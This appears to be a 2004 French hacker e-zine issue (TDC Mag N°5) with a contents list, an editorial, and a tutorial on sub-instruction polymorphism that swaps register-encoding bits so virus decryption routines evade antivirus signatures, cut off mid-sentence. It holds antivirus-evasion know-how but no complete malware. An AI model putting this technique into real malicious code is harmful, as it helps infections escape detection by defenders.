<html xmlns:v="urn:schemas-microsoft-com:vml"
xmlns:o="urn:schemas-microsoft-com:office:office"
xmlns:w="urn:schemas-microsoft-com:office:word"
xmlns="http://www.w3.org/TR/REC-html40">

<head>
<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
<meta name=ProgId content=Word.Document>
<meta name=Generator content="Microsoft Word 9">
<meta name=Originator content="Microsoft Word 9">
<link rel=File-List href="./TDC%20Mag%20N°5_fichiers/filelist.xml">
<link rel=Edit-Time-Data href="./TDC%20Mag%20N°5_fichiers/editdata.mso">
<!--[if !mso]>
<style>
v\:* {behavior:url(#default#VML);}
o\:* {behavior:url(#default#VML);}
w\:* {behavior:url(#default#VML);}
.shape {behavior:url(#default#VML);}
</style>
<![endif]-->
<title>TDC Mag N°5</title>
<!--[if gte mso 9]><xml>
 <o:DocumentProperties>
  <o:Author>Nocte</o:Author>
  <o:LastAuthor>Nocte</o:LastAuthor>
  <o:Revision>2</o:Revision>
  <o:TotalTime>3</o:TotalTime>
  <o:Created>2004-02-07T15:20:00Z</o:Created>
  <o:LastSaved>2004-02-07T15:23:00Z</o:LastSaved>
  <o:Pages>3</o:Pages>
  <o:Words>1132</o:Words>
  <o:Characters>6453</o:Characters>
  <o:Company>DHS</o:Company>
  <o:Lines>53</o:Lines>
  <o:Paragraphs>12</o:Paragraphs>
  <o:CharactersWithSpaces>7924</o:CharactersWithSpaces>
  <o:Version>9.2812</o:Version>
 </o:DocumentProperties>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <w:WordDocument>
  <w:HyphenationZone>21</w:HyphenationZone>
 </w:WordDocument>
</xml><![endif]-->
<style>
<!--
A:hover {
	COLOR: #e9ffff; TEXT-DECORATION: none
}
 /* Font Definitions */
@font-face
	{font-family:Verdana;
	panose-1:2 11 6 4 3 5 4 4 2 4;
	mso-font-charset:0;
	mso-generic-font-family:swiss;
	mso-font-pitch:variable;
	mso-font-signature:647 0 0 0 159 0;}
 /* Style Definitions */
p.MsoNormal, li.MsoNormal, div.MsoNormal
	{mso-style-parent:"";
	margin:0cm;
	margin-bottom:.0001pt;
	mso-pagination:widow-orphan;
	font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCCCCC;}
a:link, span.MsoHyperlink
	{color:#A9BFC7;
	mso-text-animation:none;
	text-decoration:none;
	text-underline:none;
	text-decoration:none;
	text-line-through:none;}
a:visited, span.MsoHyperlinkFollowed
	{color:#A9BFC7;
	mso-text-animation:none;
	text-decoration:none;
	text-underline:none;
	text-decoration:none;
	text-line-through:none;}
p
	{font-size:12.0pt;
	font-family:"Times New Roman";
	mso-fareast-font-family:"Times New Roman";
	color:#CCCCCC;}
p.text, li.text, div.text
	{mso-style-name:text;
	margin-right:0cm;
	mso-margin-top-alt:auto;
	mso-margin-bottom-alt:auto;
	margin-left:0cm;
	mso-pagination:widow-orphan;
	font-size:8.5pt;
	font-family:Verdana;
	mso-fareast-font-family:"Times New Roman";
	mso-bidi-font-family:"Times New Roman";
	color:#A9BFC7;}
@page Section1
	{size:595.3pt 841.9pt;
	margin:70.85pt 70.85pt 70.85pt 70.85pt;
	mso-header-margin:35.4pt;
	mso-footer-margin:35.4pt;
	mso-paper-source:0;}
div.Section1
	{page:Section1;}
-->
</style>
<!--[if gte mso 9]><xml>
 <o:shapedefaults v:ext="edit" spidmax="1027"/>
</xml><![endif]--><!--[if gte mso 9]><xml>
 <o:shapelayout v:ext="edit">
  <o:idmap v:ext="edit" data="1"/>
 </o:shapelayout></xml><![endif]-->
</head>

<body bgcolor="#43575f" lang=FR link="#a9bfc7" vlink="#a9bfc7"
style='tab-interval:35.4pt' alink="#a9bfc7">

<div class=Section1>

<p align=center style='text-align:center'><a
href="http://www.dhs-team.org"><img border=0 width=522 height=91
id="_x0000_i1025" src="TDC%20files\DHS-bannier.gif"></a></p>

<p align=center style='text-align:center'><b><span lang=EN-GB style='font-size:
10.0pt;font-family:Verdana;mso-ansi-language:EN-GB'>DHS Team- The Dealer Hack
Security Team</span></b><span lang=EN-GB style='mso-ansi-language:EN-GB'><o:p></o:p></span></p>

<p align=center style='text-align:center'><span lang=NL style='font-size:10.0pt;
font-family:Verdana;mso-ansi-language:NL'>*************************************************************
<br>
\\\\\\\\\\\\\\\\\\\\\\\\ooooooooo:::::</span><span lang=NL style='color:red;
mso-ansi-language:NL'>TDC Mag N°5</span><span lang=NL style='font-size:10.0pt;
font-family:Verdana;mso-ansi-language:NL'>:::::ooooooooo//////////////////////</span><span
lang=NL style='mso-ansi-language:NL'><o:p></o:p></span></p>

  <p align=center style='text-align:center'><span lang=NL style='font-size:10.0pt;
font-family:Verdana;mso-ansi-language:NL'>Ecrit le 01/03/2004</span><span
lang=NL style='mso-ansi-language:NL'><o:p></o:p></span></p>
  <p><span lang=NL style='mso-ansi-language:NL'><o:p></o:p></span></p>

<p align=center style='text-align:center'><span lang=NL style='font-size:10.0pt;
font-family:Verdana;mso-ansi-language:NL'>**************************<b>DHS Team
Contacts</b>************************** <br>
DHS Team Super Admin: </span><span lang=NL style='font-size:10.0pt;font-family:
Verdana;color:red;mso-ansi-language:NL'>Nocte</span><span lang=NL
style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> =&gt; </span><span
style='font-size:10.0pt;font-family:Verdana'><a href="mailto:nocte@dhs-team.org"><span
lang=NL style='mso-ansi-language:NL'>nocte@dhs-team.org</span></a></span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Admin &amp; Rédacteur : </span><span lang=NL style='font-size:10.0pt;
font-family:Verdana;color:red;mso-ansi-language:NL'>deepfear</span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'>
=&gt; </span><span style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:deepfear@dhs-team.org"><span lang=NL style='mso-ansi-language:
NL'>deepfear@dhs-team.org</span></a></span><span lang=NL style='font-size:10.0pt;
font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Admin &amp; Webmaster: </span><span lang=NL style='font-size:10.0pt;
font-family:Verdana;color:red;mso-ansi-language:NL'>NaNoStaCk</span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'>
=&gt; </span><span style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:nanostack@dhs-team.org"><span lang=NL style='mso-ansi-language:
NL'>nanostack@dhs-team.org</span></a></span><span lang=NL style='font-size:
10.0pt;font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Member &amp; Super Moderator : </span><span lang=NL style='font-size:
10.0pt;font-family:Verdana;color:red;mso-ansi-language:NL'>vRz</span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'>
=&gt; </span><span style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:vrz@dhs-team.org"><span lang=NL style='mso-ansi-language:NL'>vrz@dhs-team.org</span></a></span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Member : </span><span lang=NL style='font-size:10.0pt;font-family:
Verdana;color:red;mso-ansi-language:NL'>An0nym0uS</span><span lang=NL
style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> =&gt; </span><span
style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:an0nym0us@dhs-team.org"><span lang=NL style='mso-ansi-language:
NL'>an0nym0us@dhs-team.org</span></a></span><span lang=NL style='font-size:
10.0pt;font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Member : </span><span lang=NL style='font-size:10.0pt;font-family:
Verdana;color:red;mso-ansi-language:NL'>etherlord</span><span lang=NL
style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> =&gt; </span><span
style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:etherlord@dhs-team.org"><span lang=NL style='mso-ansi-language:
NL'>etherlord@dhs-team.org</span></a></span><span lang=NL style='font-size:
10.0pt;font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Member : </span><span lang=NL style='font-size:10.0pt;font-family:
Verdana;color:red;mso-ansi-language:NL'>tolwin</span><span lang=NL
style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> =&gt; </span><span
style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:tolwin@dhs-team.org"><span lang=NL style='mso-ansi-language:NL'>tolwin@dhs-team.org</span></a></span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> <br>
DHS Team Member : </span><span lang=NL style='font-size:10.0pt;font-family:
Verdana;color:red;mso-ansi-language:NL'>warlock</span><span lang=NL
style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'> =&gt; </span><span
style='font-size:10.0pt;font-family:Verdana'><a
href="mailto:warlock@dhs-team.org"><span lang=NL style='mso-ansi-language:NL'>warlock@dhs-team.org</span></a></span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'>
*********************************************************************</span><span
lang=NL style='mso-ansi-language:NL'><o:p></o:p></span></p>

<p><span lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
NL'>/////////////////////////////////////////////////////////////////////////////////////////////////
<br>
SOMMAIRE<br>
/////////////////////////////////////////////////////////////////////////////////////////////////
</span><span lang=NL style='mso-ansi-language:NL'><o:p></o:p></span></p>

  <p><span lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
NL'>1 - EDITO : TDC N°5<br>
    2 - VIRUS :<b> Polymorphisme sub-instruction par motif de bits</b> - tolwin<br>
    3 - REVERSE ENGINEERING AVANCE :<b> Les Registres Debug d'Intel et le bit 
    GD du registre DR7</b>- etherlord<br>
    4 - SECURITE : <b>Prendre le contr&ocirc;le avec une Format String</b> - Nocte<br>
    5 – HACKING – <b>Advanced Buffer Overflows Exploitation : Bypassing PaX Protection 
    </b></span><span lang=NL style='font-size:10.0pt;font-family:
Arial;mso-ansi-language:NL'>- Nocte</span><span lang=NL style='font-size:10.0pt;
font-family:Verdana;mso-ansi-language:NL'><br>
    6 - FAILLES &amp; EXPLOITS : <b> DHS Team Advisories &amp; Exploits </b></span><span
lang=NL style='font-size:10.0pt;font-family:Arial;mso-ansi-language:NL'>- DHS 
    Team</span><span
lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:NL'><br>
    ///////////////////////////////////////////////////////////////////////////////////////////////// 
    </span><span lang=NL style='mso-ansi-language:NL'><o:p></o:p></span></p>
  <p><span style='font-size:10.0pt;font-family:Verdana'>=====================================================================
<br>
1. EDITO.<br>
===================================================================== </span></p>

  <p>Huuuu! Y0 world :) TDC Mag issue 5 is h3r3 :p On se demandait d'ailleurs 
    si un jour, il allait sortir. Il atteint ainsi le même nombre d'opus que le 
    célèbre e-zine de rtc...<br>
    Sauf que, pour une fois, on ne vient pas les mains vides. Le WebSite de DHS 
    Team sera online durant le mois de mars, c'est sur maintenant =&gt; http://www.dhs-team.org, 
    accompagné de notre Challenge : Heavy Hacking Challenge ;-) Merci à NaNo pour 
    son excellent travail et pour vRz qui a taffé sur le Challenge, ainsi que 
    tous les Teamer de DHS :)<br>
    On réapparaît donc pour notre e-zine près de 6 mois après le numéro 4! Pourquoi 
    tant d'attente ? La Team a beaucoup évolué, elle a été restructuré et chaque 
    membre taff pour quelque chose de précis autour d'une organisation évidente. 
    En outre, l'un des Super Admin de DHS, A-bone a définitivement quitté l'underground 
    français ce qui a permit à NaNoStaCk de devenir admin de DHS. Niveau mag, 
    pour cette fois, pas de DHS Security Advisories &amp; Exploits : le prochain 
    aurait un article &eacute;norme sur toutes les failles DHS, et une r&eacute;flexion 
    sur les m&eacute;thodes de recherches. Par contre, ici, des articles de l33tz 
    sur l'ASM, les processeurs Intel, les format string vuln... Notre site propose 
    également des Défis de programmation / Security Hacking. <br>
    Toute team de Hacking Security se doit maintenant d'entreprendre des changements, 
    des nouvelles conceptions pour survivre. Pourquoi ? Parce que le Net est tellement 
    envahi de &quot;teams&quot; ou boards de Hacks qui recopient des codes censés 
    &quot;pirater&quot; (ouah! quel classe ce mot !), &quot;hacker&quot;, ou &quot;nicker 
    la mère aux autres&quot; qu'il faut avoir un niveau relativement élevé pour 
    se démarquer d'eux. Aujourd'hui, ce sont des boards de djeunz, des &quot;Centres 
    de Newbies&quot; comme ils disent, des teams de l'Und3rGrouND qui polluent 
    le Net. Putain, c'est tellement cool de virer l'index de IH.... Enfin, quoi 
    qu'il en soit, on essaie nous aussi de progresser et d'être actif. </p>
  <p>Pour informations, la suite de l'article de deepfear : Virus ELF Part 2 para&icirc;tra 
    dans le prochain num&eacute;ro.</p>
  <p>Sur ce, bonne lecture et amusez-vous bien (mais pas trop quand même :p) </p>

  <p>DHS Team Admin </p>
  <p>&nbsp;</p>

  <p><span style='font-size:10.0pt;font-family:Verdana'>===================================================================== 
    <br>
    2 . : </span><span lang=NL style='font-size:10.0pt;font-family:Verdana;mso-ansi-language:
NL'><b>POLYMORPHISME SUB-INSTRUCTION PAR MOTIF DE BITS</b></span><span style='font-size:10.0pt;font-family:Verdana'><br>
    ===================================================================== </span></p>

  <p><span lang=EN-GB style='font-size:10.0pt;font-family:Arial;mso-ansi-language:
EN-GB'>Date : 20/12/2004<br>
    Auteur : </span><span style='font-size:10.0pt;font-family:Arial'><a
href="mailto:tolwin@dhs-team.org"><span lang=EN-GB style='mso-ansi-language:
EN-GB'>tolwin</span></a></span><span lang=EN-GB style='font-size:10.0pt;
font-family:Arial;mso-ansi-language:EN-GB'><br>
    Produit : </span><span lang=EN-GB style='mso-ansi-language:EN-GB'><o:p>All 
    Windows :p</o:p></span></p>

  <p><span lang=EN-GB style='mso-ansi-language:EN-GB'><br>
    0 - Introduction<br>
    ----------------</span></p>
  <p>Avant tout, ce texte est pr&eacute;vu pour &ecirc;tre lu avec une police 
    Console, en raison des deux ou trois tableaux que vous y trouverez.</p>
  <p>Retour dans les ann&eacute;es 95. Je lisais beaucoup de documents sur l'assembleur, 
    m'int&eacute;ressant plus particuli&egrave;rementaux techniques de furtivit&eacute; 
    utilis&eacute;es par les virus ms-dos. Entre autre choses, j'avais trouv&eacute; 
    un article quitraitait de ce dont je vais parler. Depuis, je n'ai pas Particuli&egrave;rement 
    entendu reparler de cette technique. Pourtant, je la trouve int&eacute;ressante. 
    Primo car elle peut s'av&eacute;rer efficace, secundo parce qu'elle entraine 
    encore plus loin dans la compr&eacute;hension de la machine.</p>
  <p></p>
  <p>I - Pourquoi le ploymorphisme<br>
    -----------------------------</p>
  <p>Ah si j'&eacute;tais invisible... Serais-je un gentil ou un m&eacute;chant 
    ? Avec les pleins-pouvoirs de l'invisibilit&eacute;, je pense que je verserais 
    plut&ocirc;t du c&ocirc;t&eacute; obscur. Ben quoi. Et j'aurais beau croiser 
    des policiers ou des douaniers, je n'aurais rien &agrave; craindre. Impossible 
    de me reconnaitre. Quelle belle vie pour un m&eacute;chant.</p>
  <p>Dans l'ordinateur, c'est aussi la guerre. Antivirus et moniteurs de comportement 
    y tiennent lieu de policiers et douaniers. Et si M. Phelps se met un bout 
    de caoutchouc sur la figure pour leurer l'adversaire, le programme malicieux 
    peut &eacute;galement recourir au postiche et se grimer. L&agrave; est l'art 
    du polymorphisme.</p>
  <p>Les antivirus se basent principalement sur des signatures. Une signature, 
    ca peut &ecirc;tre des s&eacute;quences d'octets connues dans le code d'un 
    programme dangeureux. Ca peut &eacute;galement &ecirc;tre un CRC op&eacute;r&eacute; 
    sur tel bout du code.Le principe est donc de rendre le code du programme le 
    plus Insaisissable possible afin d'emp&ecirc;cher au maximum qu'une cha&icirc;ne 
    de signature ou un CRC puisse &ecirc;tre constitu&eacute;.</p>
  <p>Le polymorphisme est un moyen utilis&eacute; pour d&eacute;guiser le contenu 
    d'un programme. Polymorphe -&gt; plusieurs formes.</p>
  <p>L'autre m&eacute;thode antivirale est l'analyse heuristique. Elle est moins 
    utilis&eacute;e car plus gourmande en ressources. Raoul veut bien installer 
    Norton sur son PC, mais il ne faut pas que Norton fasse ralentir Need For 
    Speed. Un pc c'est fait pour jouer, bordel !</p>
  <p>Dommage car elle est assez efficace. Ax&eacute;e &quot;micro reverse engineering&quot;, 
    elle analyse le code d'un programme et peut y d&eacute;celer des comportements 
    suspects, comme tenter d'&eacute;crire sur le secteur de boot du disque dur, 
    ou m&ecirc;me d&eacute;tecter une boucle de cryptage impl&eacute;ment&eacute;e 
    sans discr&eacute;tion. Du temps <br>
    de Windows 3.11, je ne sais plus lequel de F-Prot ou TBAV int&eacute;grait 
    une analyse heuristique assez efficace. A l'&eacute;poque, je praticais beaucoup 
    l'assembleur 16 bits et cet anti-virus &eacute;tait pour moi un bon test de 
    discr&eacute;tion.</p>
  <p>Cette m&eacute;thode g&eacute;n&egrave;re aussi son lot de faux positifs, 
    et Raoul risquerait de ne plus acheter ses mises &agrave; jour d'antivirus 
    si son Norton lui r&eacute;p&egrave;te tous les jours que Format et Fdisk 
    sont des programmes dangeureux. Raoul, je dois les effacer ou les ignorer 
    ? Heuuuuu... N'oublions pas : fdisk, Raoul il connait pas.</p>
  <p>C'est l'universelle loi du march&eacute; : incomp&eacute;tence et paresse 
    des milliards de clients sont les ennemis de la performance d'un pauvre petit 
    produit. Au passage, je fais remarquer que ce <br>
    principe s'applique en politique et en culture &eacute;galement. D'ailleurs 
    qui soutiendrait que culture et politique ne sont pas des marchandises ?</p>
  <p></p>
  <p>II - Voyage au centre du Polymorphisme<br>
    ------------------------------------------</p>
  <p>Je vous invite &agrave; un peu d'histoire. Rapidement, on va passer en revue 
    les grandes familles de techniques de brouillage de code, depuis le cryptage 
    jusqu'au polymorphisme.</p>
  <p>Un programme avec une partie de son code brouill&eacute; par une fonction 
    de cryptage n'est pas &agrave; proprement parler polymorphique : si c'est 
    toujours ce m&ecirc;me programme avec cette m&ecirc;me boucle <br>
    de cryptage qui est utilis&eacute;e, alors cryptage ou pas il n'existe bel 
    et bien qu'une seule forme. Et &quot;un&quot; c'est pas &quot;plusieurs&quot;. 
    Sisi j'insiste. C'est un axiome fondamental pour le ploymorphisme ;)</p>
  <p>Le cryptage sert pour brouiller des informations, pour les rendre illisibles. 
    Par exemple, crypter les chaines de caract&egrave;res d'un programme pour 
    &eacute;viter que Raoul, arm&eacute; de Hex Edit, ne <br>
    s'amuse &agrave; mettre son nom partout &agrave; la place du votre, le programmeur, 
    avec le m&ecirc;me Q.I. qu'un chien qui pisse sur les lampadaires. Pour &eacute;viter 
    aussi que Norton n'utilise comme signature pour votre programme malicieux 
    la subtile pens&eacute;e dont vous &ecirc;tes si fier et que vous imposez 
    &agrave; la vue de vos victimes juste avant leur mort : &quot;je t&eacute; 
    nik&eacute; b&eacute;to chuis mailleur ke toua&quot;. Une bien<br>
    humiliante post&eacute;rit&eacute; peut s'&eacute;viter avec un simple XOR, 
    sinon le monde entier apprendra dans les pages du Virus Informatique que DeathBringerKingOfRulez 
    &eacute;crit aussi mal le fran&ccedil;ais que le <br>
    C++. Mais passons...</p>
  <p>+-----------------------+<br>
    | Routine de d&eacute;cryptage |<br>
    +-----------------------+<br>
    +-----------------------+<br>
    | Partie crypt&eacute;e |<br>
    +-----------------------+</p>
  <p><br>
    Une des premi&egrave;res am&eacute;liorations a &eacute;t&eacute; de transmettre, 
    par exemple &agrave; chaque nouvelle infection d'un virus, une version du 
    programme crypt&eacute; avec une nouvelle valeur. Les variantes sont multiples 
    comme le compteur de milisecondes tir&eacute; de l'horloge de l'ordinateur. 
    Le code crypt&eacute; change bien d'apparence &agrave; chaque fois. On a obtenu 
    un polymorphisme de cl&eacute; de cryptage.</p>
  <p>+-----------------------+<br>
    | Routine de d&eacute;cryptage |<br>
    +-----------------------+<br>
    | Cl&eacute; variable |<br>
    +-----------------------+<br>
    +-----------------------+<br>
    | Partie crypt&eacute;e |<br>
    +-----------------------+</p>
  <p><br>
    Puis on s'est rendu compte que la routine de d&eacute;cryptage suffisait &agrave; 
    &eacute;tablir une signature. Se faire trahir par ses propres armes, quel 
    coup du sort ! On a donc fourni au programme un stock de <br>
    4 ou 5 routines de d&eacute;cryptage parfaitement compatibles entre elles. 
    Lors d'une nouvelle infection, on change la cl&eacute; de cryptage mais on 
    extrait du programme une nouvelle fonction de d&eacute;cryptage. Ainsi, cette 
    fonction ne peut plus &ecirc;tre utilis&eacute;e pour &eacute;tablir une signature. 
    On a du polymorphisme de fonction.</p>
  <p>+-------------------------------------+<br>
    | Une des routines de d&eacute;cryptage |<br>
    +-------------------------------------+<br>
    | Cl&eacute; variable |<br>
    +-------------------------------------+<br>
    +-------------------------------------+<br>
    | Partie crypt&eacute;e |<br>
    | +----------------------------------+<br>
    | | Stock crypt&eacute; des autres routines |<br>
    | | de d&eacute;cryptage |<br>
    +--+----------------------------------+</p>
  <p><br>
    Certains antivirus ont alors d&eacute;cid&eacute;s de mettre 4 ou 5 signatures 
    pour un m&ecirc;me programme dangeureux, une par routine de d&eacute;cryptage. 
    La strat&eacute;gie a donc &eacute;t&eacute; de brouiller les routines. Toutes 
    les deux ou trois instructions assembleur, le programme comporte quelques 
    octets en plus. A chaque r&eacute;plication, le programme y &eacute;crit les 
    valeurs d'instructions qui ne perturbent pas le cours de a routine, comme 
    un NOP, diff&eacute;rentes &agrave; chaque fois. Le polymorphisme descend 
    au niveau de l'instruction. La fonction elle-m&ecirc;me change d'apparence 
    tout en restant op&eacute;rationnelle. Un exemple de routine de d&eacute;cryptage 
    :</p>
  <p>+----------------+......<br>
    | Zoom :) | ......<br>
    | +-------------+ .....<br>
    | | valide | ......<br>
    | | remplissage | .....+-------------------------------------+<br>
    | | valide | | Une des routines de d&eacute;cryptage |<br>
    | | valide | ...+-------------------------------------+<br>
    | | remplissage | .... | Cl&eacute; variable |<br>
    | | valide | .... +-------------------------------------+<br>
    | | remplissage | .... +-------------------------------------+<br>
    | | remplissage | .... | Partie crypt&eacute;e |<br>
    | | ... | .... | +----------------------------------+<br>
    | | ... | .... | | Stock crypt&eacute; des autres routines |<br>
    +--+-------------+.... | | de d&eacute;cryptage |<br>
    +--+----------------------------------+</p>
  <p><br>
    Pour finir cette fuite vers la finesse des alt&eacute;rations polymorphiques, 
    reste le sujet de ce papier : le polymorphisme au niveau sub-instruction, 
    par motif de bits.</p>
  <p></p>
  <p>III - L'assembleur, de l'instruction &agrave; l'octet<br>
    --------------------------------------------</p>
  <p>Voici un exemple de code assembleur. Court et simple, il se contente de pousser 
    la cha&icirc;ne MessageBoxA dans un stack frame. L'exemple en soi est stupide, 
    mais c'est sur celui l&agrave; que j'ai commenc&eacute; &agrave; travailler 
    donc je continue avec. A c&ocirc;t&eacute; des instructions assembleur, j'ai 
    inscris les valeurs des octets correspondants.</p>
  <p>mov eax,'sseM' B8 4D 65 73 73<br>
    mov [ebp-0x1c], eax 89 45 E4<br>
    mov eax,'Bega' B8 61 67 65 42<br>
    mov [ebp-0x18], eax 89 45 E8<br>
    mov ax,'xo' 66 B8 6F 78<br>
    mov [ebp-0x14], ax 66 89 45 EC<br>
    xor ax,ax 66 33 C0<br>
    mov al,'A' B0 41<br>
    mov [ebp-0x12], ax 66 89 45 EE</p>
  <p><br>
    Les octets des mn&eacute;moniques assembleur sont lues et d&eacute;cod&eacute;es 
    par le processeur. Basiquement, une instruction assembleur se d&eacute;compose 
    de la mani&egrave;re suivante :</p>
  <p>+-----------+------------------+-------------+-------------+<br>
    | OPERATION | mode d'adressage | parametre 1 | parametre 2 |<br>
    +-----------+------------------+-------------+-------------+</p>
  <p><br>
    On peut d&eacute;composer la premi&egrave;re ligne d'instruction de l'exemple. 
    B8 contient, aux yeux du processeur, lesinformations disant qu'ici commence 
    une instruction assembleur qui charge un <br>
    registre 32 bits avec une valeur imm&eacute;diate, et que ce registre est 
    EAX.</p>
  <p>+-----------+------------------+-------------+-------------+<br>
    | OPERATION | mode d'adressage | parametre 1 | parametre 2 |<br>
    +-----------+------------------+-------------+-------------+<br>
    | MOV EAX valeur imm&eacute;diate | 'sseM' | rien |<br>
    +-----------+------------------+-------------+-------------+<br>
    | B8 | 4D 65 73 73 |<br>
    +------------------------------+---------------------------+</p>
  <p><br>
    Maintenant, voici la m&ecirc;me routine mais quatre fois de suite. A chaque 
    coup, je change le registre de travail utilis&eacute; par la routine. Dans 
    sa grande majorit&eacute;, les octets codant les op&eacute;rations sont similaires. 
    On d&eacute;c&egrave;le juste quelques petites variations, dont on vient de 
    voir l'explication. <br>
    Entre un mov eax et un mov ebx, seul change de quoi dire au processeur quel 
    est le registre cibl&eacute;. J'ai mis entre parenth&egrave;ses les diff&eacute;rences 
    &agrave; observer.</p>
  <p>//Travail avec EAX<br>
    mov eax,'sseM' (B8) 4D 65 73 73<br>
    mov [ebp-0x1c], eax 89 (45) E4<br>
    mov eax,'Bega' (B8) 61 67 65 42<br>
    mov [ebp-0x18], eax 89 (45) E8<br>
    mov ax,'xo' 66 (B8) 6F 78<br>
    mov [ebp-0x14], ax 66 89 (45) EC<br>
    xor ax,ax 66 33 (C0)<br>
    mov al,'A' (B0) 41<br>
    mov [ebp-0x12], ax 66 89 (45) EE</p>
  <p>//Travail avec EBX<br>
    mov ebx,'sseM' (BB) 4D 65 73 73<br>
    mov [ebp-0x1c], ebx 89 (5D) E4<br>
    mov ebx,'Bega' (BB) 61 67 65 42<br>
    mov [ebp-0x18], ebx 89 (5D) E8<br>
    mov bx,'xo' 66 (BB) 6F 78<br>
    mov [ebp-0x14], bx 66 89 (5D) EC<br>
    xor bx,bx 66 33 (DB)<br>
    mov bl,'A' (B3) 41<br>
    mov [ebp-0x12], bx 66 89 (5D) EE</p>
  <p>//Travail avec ECX<br>
    mov ecx,'sseM' (B9) 4D 65 73 73<br>
    mov [ebp-0x1c], ecx 89 (4D) E4<br>
    mov ecx,'Bega' (B9) 61 67 65 42<br>
    mov [ebp-0x18], ecx 89 (4D) E8<br>
    mov cx,'xo' 66 (B9) 6F 78<br>
    mov [ebp-0x14],cx 66 89 (4D) EC<br>
    xor cx,cx 66 33 (C9)<br>
    mov cl,'A' (B1) 41<br>
    mov [ebp-0x12], cx 66 89 (4D) EE</p>
  <p>//Travail avec EDX<br>
    mov edx,'sseM' (BA) 4D 65 73 73<br>
    mov [ebp-0x1c], edx 89 (55) E4<br>
    mov edx,'Bega' (BA) 61 67 65 42<br>
    mov [ebp-0x18], edx 89 (55) E8<br>
    mov dx,'xo' 66 (BA) 6F 78<br>
    mov [ebp-0x14], dx 66 89 (55) EC<br>
    xor dx,dx 66 33 (D2)<br>
    mov dl,'A' (B2) 41<br>
    mov [ebp-0x12], dx 66 89 (55) EE</p>
  <p><br>
    Seul un octet de chaque instruction est modifi&eacute;. L'id&eacute;e au coeur 
    du polymorphisme sub-instruction est de modifier chaque octet sensible afin 
    que toute une routine se mette &agrave; travailler avec <br>
    EAX au lieu de EBX, puis EDX lors de la prochaine infection. La routine reste 
    100% fonctionnelle, sauf que son registre de travail principal change, et 
    donc sa repr&eacute;sentation en octet devient variable.</p>
  <p>Le souci est que pour chaque instruction il faut stocker les 4 octets &agrave; 
    utiliser : dans le cas de EAX, EBX, ECX et EDX. Rien que dans le court exemple, 
    4 octets sont modifi&eacute;s lorsqu'on change <br>
    de registre, multipli&eacute;s par 4 registres, c'est un jeu de 16 octets 
    qu'il faut avoir sous le coude en guise de maquillage. Plus un bout de code 
    pour veiller &agrave; la mutation de la routine.</p>
  <p>On arrive &agrave; cette mod&eacute;lisation du corps du programme :</p>
  <p>+-------------------------------------+<br>
    | Une des routines de d&eacute;cryptage |<br>
    +-------------------------------------+<br>
    | Cl&eacute; variable |<br>
    +-------------------------------------+<br>
    +-------------------------------------+<br>
    | Partie crypt&eacute;e |<br>
    | +----------------------------------+<br>
    | | Stock crypt&eacute; des autres routines |<br>
    | | de d&eacute;cryptage |<br>
    | +----------------------------------+<br>
    | | Moteur de motation polymorphique |<br>
    | | avec octets de remplacement et |<br>
    | | adresse des emplacements |<br>
    | | &agrave; modifier |<br>
    +--+----------------------------------+</p>
  <p></p>
  <p></p>
  <p>IV - L'assembleur, de l'octet au bit<br>
    ------------------------------------</p>
  <p>Pour &eacute;viter de se trimbaler une &eacute;norme base de donn&eacute;es 
    des octets par fonction et par registre, un coup de microscope va s'av&eacute;rer 
    payant. Voici un d&eacute;tail des 4 octets correspondant aux 4 registres 
    utilis&eacute;s dans la fonction d'exemple, ainsi que leurs &eacute;quivalents 
    en binaire.</p>
  <p>+-------------+-------------+-------------+-------------+---------------------+<br>
    | EAX | ECX | EDX | EBX | VARIATIONS <br>
    |<br>
    +-------------+-------------+-------------+-------------+---------------------+<br>
    | B8 10111000 | B9 10111001 | BA 10111010 | BB 10111011 | 2 bits : <br>
    101110xx |<br>
    | 45 01000101 | 4D 01001101 | 55 01010101 | 5D 01011101 | 2 bits : <br>
    010xx101 |<br>
    | C0 11000000 | C9 11001001 | D2 11010010 | DB 11011011 | 2x2 Bits : <br>
    110xx0xx |<br>
    | B0 10110000 | B1 10110001 | B2 10110010 | B3 10110011 | 2 Bits : <br>
    101100xx |<br>
    +-------------+-------------+-------------+-------------+---------------------+<br>
    | bits &agrave; 00 | bits &agrave; 01 | bits &agrave; 10 | bits &agrave; 11 
    | <br>
    |<br>
    +-------------+-------------+-------------+-------------+---------------------+</p>
  <p><br>
    L&agrave;, r&eacute;v&eacute;lation. Les motifs binaires montrnt bien que 
    seuls deux bits sont utilis&eacute;s pour coder lequel des quatre registres 
    est utilis&eacute;.</p>
  <p><br>
    On a vu comme une instruction assembleur &eacute;tait structur&eacute;e en 
    &eacute;l&eacute;ments que le processeur reconnait et d&eacute;code. On a 
    vu comme ces parties &eacute;taient parfois repr&eacute;sent&eacute;es par 
